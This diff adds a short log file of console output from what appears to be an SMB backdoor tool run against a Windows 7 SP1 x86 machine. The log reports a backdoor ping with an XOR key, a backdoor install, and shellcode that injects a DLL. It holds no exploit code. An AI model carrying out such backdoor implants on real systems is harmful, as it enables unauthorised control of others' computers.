@@ -1,0 +1,15 @@
+[+] Selected Protocol SMB
+[.] Connecting to target...
+[+] Connected to target, pinging backdoor...
+	[+] Backdoor returned code: 10 - Success!
+	[+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x8DEB337D
+    SMB Connection string is: Windows 7 Ultimate 7601 Service Pack 1
+    Target OS is: 7 x86
+    Target SP is: 1
+	[+] Backdoor installed
+	[+] DLL built
+	[.] Sending shellcode to inject DLL
+	[+] Backdoor returned code: 10 - Success!
+	[+] Backdoor returned code: 10 - Success!
+	[+] Backdoor returned code: 10 - Success!
+	[+] Command completed successfully
